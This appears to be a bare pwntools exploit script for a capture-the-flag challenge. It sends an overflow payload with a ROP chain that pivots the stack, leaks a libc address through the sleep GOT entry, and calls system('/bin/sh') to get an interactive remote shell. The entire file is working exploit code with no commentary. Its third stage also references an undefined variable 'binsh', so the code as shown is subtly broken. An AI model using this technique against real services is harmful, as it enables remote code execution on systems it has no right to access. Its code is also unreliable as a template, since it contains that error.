#!/usr/bin/python

from pwn import *
from struct import pack, unpack

r = remote("7e0a98bb084ec0937553472e7aafcf68ff96baf4.ctf.site" ,10000)

dat = "\x81@\x00\x08\xe7\x00\x00@\x00\x07@v\x00 \xe0w\x8f\x16vC`\x9f\x06D\x00A\x03\x80{\x00\x00\x00\x00\x80\x00\x00\x00'\x00\x00\x1f\x00X\x00\x00\x00\x03pB\x00h\x00\x9d@a\x00W@\x15\x03\x81\x1f(\x00\x0cq@\x00\x00@\xc0\x1fF\x04tH\x00 6T,\xc5 \x02\x00k[Q\x00\x00@\x10\x00\x00/\x00\x18I\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"[:0x64] 
print r.recvuntil("? ")
pop4_ret = 0x0040567c
mov_rdx_rsi_edi = 0x00405660
pop_rdi = 0x00405683
pop_rsp = 0x40567d
pad = 0x4141414141414141
sleep_got_addr = 0x0000000000606040
read_plt = 0x00000000004009d0
read_got = 0x0000000000606070
printf_plt = 0x0000000000400930
write_plt = 0x0000000000400960
write_got = 0x0000000000606038
# stage 1 pivot addr 
pivot_addr = 0x606500 
pl = pack("< QQQQQ QQQQQ QQQQQQQQQ Q"
	, 0x1, 0x1, 0x1, 0x1, 0x1 				# set rbp = 1
        , pop4_ret, read_got, 0x1111, pivot_addr, 0 
        , mov_rdx_rsi_edi, pad, 0, 1, write_got, pad, pad, pad
        , pop_rsp, pivot_addr
        )

# stage 2 leak libc
binbash = pivot_addr + 8 * 21
pl2 = pack("<QQQ QQQ QQQQQ QQ QQQQQQQQ"
	, 0x8, sleep_got_addr, 0
        , mov_rdx_rsi_edi, pad, 0, 1, read_got, 0x1111, pivot_addr, 0 
        , mov_rdx_rsi_edi, pad, 0, 1, read_got, 0x1111, pivot_addr, 0
        , pop_rsp, pivot_addr
) + "/bin/sh\x00"
r.sendline(dat + pl)
r.sendline(pl2)
print r.recvuntil("!")
sleep_addr = unpack("<Q", r.recvn(8))[0]
system_addr = sleep_addr - 550016

#stage 3 call system("/bin/sh")
pl3 = pack("<QQQ QQQ"
	, binbash, binbash, binsh
        , pop_rdi, binbash, system_addr 
)
r.sendline(pl3)
r.interactive()